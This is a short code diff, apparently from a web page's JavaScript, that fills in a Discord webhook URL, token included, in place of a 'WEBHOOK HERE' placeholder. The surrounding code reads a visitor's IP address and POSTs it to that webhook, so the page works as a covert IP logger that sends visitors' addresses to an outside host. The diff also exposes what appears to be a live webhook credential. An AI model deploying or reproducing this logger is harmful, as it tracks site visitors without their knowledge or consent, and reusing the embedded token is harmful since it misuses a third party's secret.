@@ -5,7 +5,7 @@
                                          var ipAddress = data.ip; 
                                          $.ajax({ 
                                                  type: "POST", 
-                                                 url: "WEBHOOK HERE", 
+                                                 url: "https://discord.com/api/webhooks/1129328426503905351/rX4l5Sv1Y0UAYbrmzFj6G2jyRroHyOnhXfeyS-0knV9eabFntCPfjqZ4hnAzXxVp6FQD", 
                                                  contentType: "application/json", 
                                                  data: JSON.stringify({"content": "IP Address: " + ipAddress}), 
                                                  success: function() { 
